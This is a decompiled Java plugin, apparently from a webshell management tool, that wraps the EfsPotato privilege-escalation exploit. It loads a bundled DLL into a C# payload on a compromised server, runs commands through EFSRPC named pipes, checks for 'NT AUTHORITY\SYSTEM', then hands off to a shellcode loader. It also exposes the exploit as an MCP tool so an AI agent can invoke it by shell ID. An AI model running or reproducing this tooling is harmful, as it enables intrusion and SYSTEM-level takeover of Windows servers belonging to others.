//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.plugins.csharp;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import shells.plugins.generic.ShellcodeLoader;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;
import core.annotation.McpTool;
import core.annotation.McpParam;
import java.util.Map;

@PluginAnnotation(
    payloadName = "CSharpDynamicPayload",
    Name = "EfsPotato",
    DisplayName = "EfsPotato"
)
public class EfsPotato extends ShellcodeLoader {
    private static final String CLASS_NAME = "EfsPotato.EfsPotato";
    private static final String[] pipes = new String[]{"lsarpc", "efsrpc", "samr", "lsass", "netlogon"};
    private static final String[] exploitMethods = new String[]{"EfsRpcOpenFileRaw", "EfsRpcEncryptFileSrv"};
    private final JPanel panel = new JPanel(new BorderLayout());
    private final JPanel mainPanel = new JPanel(new BorderLayout());
    private final JButton runButton = new JButton("Run");
    private final JTextField commandTextField;
    private final JSplitPane splitPane;
    private final RTextArea resultTextArea;
    private final JLabel commandTextLabel = new JLabel("Command:");
    private final JLabel pipeComboBoxLabel = new JLabel("Pipe:");
    private final JLabel exploitMethodComboBoxLabel = new JLabel("漏洞利用方法:");
    private final JComboBox pipeComboBox;
    private final JComboBox exploitMethodComboBox;
    private boolean loadState;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;
    private boolean superModel;

    public EfsPotato() {
        this.pipeComboBox = new JComboBox(pipes);
        this.exploitMethodComboBox = new JComboBox(exploitMethods);
        this.commandTextField = new JTextField(35);
        this.resultTextArea = new RTextArea();
        this.splitPane = new JSplitPane();
        this.splitPane.setOrientation(0);
        this.splitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.pipeComboBoxLabel);
        topPanel.add(this.pipeComboBox);
        topPanel.add(this.exploitMethodComboBoxLabel);
        topPanel.add(this.exploitMethodComboBox);
        topPanel.add(this.commandTextLabel);
        topPanel.add(this.commandTextField);
        topPanel.add(this.runButton);
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
        this.splitPane.addComponentListener(new ComponentAdapter() {
            public void componentResized(ComponentEvent e) {
                EfsPotato.this.splitPane.setDividerLocation(0.15);
            }
        });
        this.panel.add(this.splitPane);
        this.commandTextField.setText("cmd /c whoami");
        this.mainPanel.add(this.panel);
    }

    public boolean load() {
        if (!this.loadState) {
            try {
                InputStream inputStream = this.getClass().getResourceAsStream("assets/EfsPotato.dll");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include("EfsPotato.EfsPotato", data)) {
                    this.loadState = true;
                    return this.loadState;
                }

                return false;
            } catch (Exception var3) {
                Log.error(var3);
            }
        }

        return this.loadState;
    }

    public String getClassName() {
        return "EfsPotato.EfsPotato";
    }

    private void runButtonClick(ActionEvent actionEvent) {
        if (!this.load()) {
            GOptionPane.showMessageDialog(this.panel, "Load fail", "提示", 2);
        } else {
            ReqParameter parameter = new ReqParameter();
            parameter.add("pipe", this.pipeComboBox.getSelectedItem().toString());
            parameter.add("exploitMethod", this.exploitMethodComboBox.getSelectedItem().toString());
            parameter.add("cmd", this.commandTextField.getText());
            byte[] result = this.payload.evalFunc("EfsPotato.EfsPotato", "run", parameter);
            this.resultTextArea.setText(this.encoding.Decoding(result));
            if (!this.superModel && result != null && this.encoding.Decoding(result).toUpperCase().indexOf("NT AUTHORITY\\SYSTEM") != -1) {
                this.superModel = true;
                this.mainPanel.remove(this.panel);
                this.mainPanel.add(super.getView());
                super.tabbedPane.addTab("EfsPotato", this.panel);
                super.tabbedPane.setSelectedIndex(this.tabbedPane.getTabCount() - 1);
                ShellcodeLoader loader = (ShellcodeLoader)this.shellEntity.getFrame().getPlugin("ShellcodeLoader");
                if (loader != null) {
                    loader.childLoder = this;
                }

                GOptionPane.showMessageDialog(this.panel, "您是SYSTEM! 已升级到高级模式", "提示", 1);
            }

        }
    }

    public byte[] runShellcode(ReqParameter reqParameter, String command, byte[] shellcode, int readWait) {
        reqParameter.add("cmd", command);
        reqParameter.add("pipe", this.pipeComboBox.getSelectedItem().toString());
        reqParameter.add("exploitMethod", this.exploitMethodComboBox.getSelectedItem().toString());
        reqParameter.add("readWait", Integer.toString(readWait));
        return super.runShellcode(reqParameter, command, shellcode, readWait);
    }

    @McpTool(name = "run", desc = "EfsPotato 提权执行命令 (默认管道 lsarpc, 方法 EfsRpcOpenFileRaw)", params = {
            @McpParam(name = "shellId", required = true, desc = "Shell ID"),
            @McpParam(name = "cmd", required = true, desc = "要执行的命令, 如: cmd /c whoami"),
            @McpParam(name = "pipe", defaultValue = "lsarpc", desc = "lsarpc/efsrpc/samr/lsass/netlogon"),
            @McpParam(name = "exploitMethod", defaultValue = "EfsRpcOpenFileRaw", desc = "EfsRpcOpenFileRaw/EfsRpcEncryptFileSrv") })
    public String mcpRun(Map<String, Object> args) {
        String cmd = String.valueOf(args.get("cmd"));
        String pipe = String.valueOf(args.getOrDefault("pipe", "lsarpc"));
        String method = String.valueOf(args.getOrDefault("exploitMethod", "EfsRpcOpenFileRaw"));
        if (cmd == null || cmd.trim().isEmpty()) return "缺少参数: cmd";
        if (!this.load()) return "插件加载失败 (EfsPotato.dll include 失败)";
        try {
            ReqParameter parameter = new ReqParameter();
            parameter.add("pipe", pipe);
            parameter.add("exploitMethod", method);
            parameter.add("cmd", cmd);
            byte[] result = this.payload.evalFunc("EfsPotato.EfsPotato", "run", parameter);
            return this.encoding.Decoding(result);
        } catch (Exception e) {
            return "执行失败: " + (e.getMessage() != null ? e.getMessage() : e.toString());
        }
    }

    public void init(ShellEntity shellEntity) {
        super.init(shellEntity);
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    public JPanel getView() {
        super.getView();
        return this.mainPanel;
    }
}
